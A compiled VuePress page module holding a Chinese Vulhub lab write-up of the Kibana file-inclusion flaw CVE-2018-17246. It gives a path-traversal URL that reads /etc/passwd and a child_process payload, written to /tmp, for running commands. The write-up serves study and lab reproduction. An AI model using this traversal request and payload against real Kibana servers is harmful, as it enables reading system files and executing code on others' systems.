import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{r,o,c as s,a as e,b as a,d as n,e as d}from"./app-58e4a7d6.js";const c={},l=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),u=e("p",null,"Kibana 为 Elassticsearch 设计的一款开源的视图工具。其5.6.13到6.4.3之间的版本存在一处文件包含漏洞，通过这个漏洞攻击者可以包含任意服务器上的文件。此时，如果攻击者可以上传一个文件到服务器任意位置，即可执行代码。",-1),p=e("p",null,"参考链接：",-1),h={href:"https://nvd.nist.gov/vuln/detail/CVE-2018-17246",target:"_blank",rel:"noopener noreferrer"},g={href:"https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/",target:"_blank",rel:"noopener noreferrer"},b={href:"https://www.anquanke.com/post/id/168291",target:"_blank",rel:"noopener noreferrer"},m=d(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub启动 Kibana 5.6.12 和 Elasticsearch 5.6.16 环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:5601</code>即可看到Kibana的默认首页。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202242016950.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>直接访问如下URL，来包含文件<code>/etc/passwd</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../etc/passwd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>虽然在返回的数据包里只能查看到一个500的错误信息，但是我们通过执行<code>docker-compose logs</code>即可发现，<code>/etc/passwd</code>已经成功被包含：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202242018849.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>所以，我们需要从其他途径往服务器上上传代码，再进行包含从而执行任意命令。比如，我们可以将如下代码上传到服务器的<code>/tmp/vulhub.js</code>，文件内容为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>export default {asJson: function() {return require(&quot;child_process&quot;).execSync(&quot;id&quot;).toString()}}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>首先进入docker：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose exec kibana bash 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在docker内写入文件：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>echo &#39;export default {asJson: function() {return require(&quot;child_process&quot;).execSync(&quot;id&quot;).toString()}}&#39; &gt; /tmp/vulhub.js
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202242024051.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,17);function _(v,x){const t=r("ExternalLinkIcon");return o(),s("div",null,[l,u,p,e("ul",null,[e("li",null,[e("a",h,[a("https://nvd.nist.gov/vuln/detail/CVE-2018-17246"),n(t)])]),e("li",null,[e("a",g,[a("https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/"),n(t)])]),e("li",null,[e("a",b,[a("https://www.anquanke.com/post/id/168291"),n(t)])])]),m])}const w=i(c,[["render",_],["__file","Kibana 本地文件包含漏洞 CVE-2018-17246.html.vue"]]);export{w as default};
